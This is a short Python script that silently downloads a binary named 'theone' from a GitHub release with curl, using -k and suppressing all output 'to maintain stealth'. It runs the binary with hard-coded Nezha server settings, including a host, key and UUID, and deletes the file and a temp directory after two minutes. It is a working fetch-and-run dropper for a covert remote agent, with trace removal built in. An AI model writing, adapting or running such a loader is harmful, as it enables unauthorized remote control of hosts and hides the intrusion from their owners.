import os
import subprocess
import time
import threading
import shutil
import sys

# Configuration settings
CONFIG = {
    "file_name": "theone",
    "download_url": "https://github.com/babama1001980/good/releases/download/npc/theone",
    "tmp_dir": ".tmp",
    "env": {
        "UUID": "faacf142-dee8-48c2-8558-641123eb939c",
        "NEZHA_SERVER": "nezha.mingfei1981.eu.org",
        "NEZHA_PORT": "443",
        "NEZHA_KEY": "7LHjlPcj7gRgOrTCxl"
    },
    "delay_seconds": 120
}

# Define absolute paths for reliability
file_path = os.path.join(os.getcwd(), CONFIG["file_name"])
tmp_path = os.path.join(os.getcwd(), CONFIG["tmp_dir"])

def cleanup():
    """
    Forcefully removes the downloaded binary and the temporary directory.
    Uses basic error handling to ensure script continuity.
    """
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
        if os.path.exists(tmp_path):
            shutil.rmtree(tmp_path, ignore_errors=True)
    except Exception:
        pass

def download_file():
    """
    Downloads the target file silently using curl.
    Redirects all output to devnull to maintain stealth.
    """
    try:
        # -s: Silent mode, -L: Follow redirects, -k: Allow insecure SSL
        subprocess.run(
            ["curl", "-L", "-k", "-s", "-o", CONFIG["file_name"], CONFIG["download_url"]], 
            check=True, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        if os.path.exists(file_path):
            os.chmod(file_path, 0o755)
    except Exception:
        sys.exit(1)

def self_destruct():
    """
    Timer function meant to run in a background thread.
    Deletes specific files after the configured delay.
    """
    # Wait for 2 minutes (120 seconds) as requested
    time.sleep(CONFIG["delay_seconds"])
    cleanup()

def start_app():
    """
    Main execution logic that manages the environment and sub-processes.
    """
    # Prepare the specific environment variables for the child process
    current_env = os.environ.copy()
    current_env.update(CONFIG["env"])

    try:
        # Initiate the self-destruct timer as a daemon thread
        timer_thread = threading.Thread(target=self_destruct)
        timer_thread.daemon = True
        timer_thread.start()

        # Run the downloaded binary with suppressed output
        process = subprocess.Popen(
            [f"./{CONFIG['file_name']}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=current_env
        )

        # Wait for the binary to complete or the timer to trigger
        process.wait()
    except Exception:
        cleanup()
        sys.exit(1)

if __name__ == "__main__":
    # 1. Initial cleanup to ensure a fresh start
    cleanup()
    
    # 2. Perform silent download
    download_file()
    
    # 3. Execute and start the 2-minute countdown for cleanup
    start_app()
